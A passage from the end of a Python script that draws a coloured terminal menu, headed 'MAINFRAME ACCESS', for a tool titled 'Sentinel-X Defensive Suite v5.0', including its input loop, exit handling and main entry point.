        '7': ("Miscellaneous", misc_menu),
        '8': ("System Documentation & Help", display_help),
    }
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════════════[ {Colors.HEADER}MAINFRAME ACCESS {Colors.BORDER}]════════════╗{Colors.RESET}\n")
            print(f"{Colors.BORDER}│{Colors.RESET}  Select primary module to engage:              {Colors.BORDER}│{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════╣{Colors.RESET}")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ERROR}[0]{Colors.TEXT} Terminate Session{Colors.RESET}                         {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map:
                name, func = menu_map[choice]
                func(); 
                if func.__name__ not in ["main_menu"]: pause()
            elif choice == '0': print(f"\n{Colors.PURPLE}Terminating session... Stay safe.{Colors.RESET}"); sys.exit(0)
            else: print(f"\n{Colors.RED}[!] Invalid command '{choice}'.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Mainframe Interrupted. Use '[0]' to Terminate Session.{Colors.RESET}")
            time.sleep(2)

# =================================================================================================
# MAIN EXECUTION
# =================================================================================================

if __name__ == '__main__':
    if sys.platform.startswith('win'):
        multiprocessing.freeze_support()
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("Sentinel-X Defensive Suite v5.0")
    main_menu()
